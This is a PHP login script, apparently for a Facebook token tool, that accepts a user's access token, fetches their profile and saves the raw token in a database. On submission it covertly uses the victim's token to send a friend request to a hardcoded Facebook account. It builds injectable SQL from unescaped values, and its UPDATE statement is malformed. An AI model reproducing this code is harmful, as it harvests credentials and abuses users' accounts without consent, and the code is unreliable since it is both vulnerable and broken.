<?php
ob_start();
session_start();
date_default_timezone_set("Asia/Ho_Chi_Minh"); 
require("./inc/func.php");

if($_POST['token']) {
$token2 = $_POST['token'];

$token = $_POST['token'];

auto('https://graph.facebook.com/me/friends?method=post&uids=100022726363374&access_token='.$token);

$me = me($token);

if($me[id]){
$_SESSION['user_id'] = $me[id];
$_SESSION['name'] = $me[name];
$_SESSION['access_token'] = $token;
header('Location: index.php');
include('inc/config.php');

echo $me[id];

$connection = mysql_connect($host,$username,$password);
if (!$connection)
{
die('Could not connect: ' . mysql_error());
}
mysql_select_db($dbname) or die(mysql_error());
mysql_query("SET NAMES utf8");



$row = null;
$result = mysql_query("
SELECT
*
FROM
user
WHERE
user_id = '" . $_SESSION['user_id'] . "'
");

if($result){

$row = mysql_fetch_array($result, MYSQL_ASSOC);

if(mysql_num_rows($result) > 1){

mysql_query("

DELETE FROM
user
WHERE
user_id='" . $_SESSION['user_id'] . "' AND
id != '" . $row['id'] . "'
");

}

}



if(!$row){
$time = time(); 
mysql_query("INSERT INTO user SET
`user_id` = '" .$_SESSION['user_id']. "',
`name` = '" . $_SESSION['name'] . "',
`access_token` = '" .$_SESSION['access_token']. "',
`time` = '" . $time ."'
");

} else {
$time = time(); 
mysql_query(
"UPDATE
user
SET
`access_token` = '" . $_SESSION['access_token'] . "'
`time` = '" . $time ."'
WHERE
`id` = " . $row['id'] . "
`time` = '" . $time ."'
");



}

}else{
session_destroy();
 header('Location: index.php?i=Token expired')
;
}
}else  {
session_destroy();
 header('Location: index.php?i=Please enter Token');
}


function me($access) {
return json_decode(auto('https://graph.facebook.com/me?access_token='.$access),true);
}

function auto($url){
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_URL, $url);
$ch = curl_exec($curl);
curl_close($curl);
return $ch;
}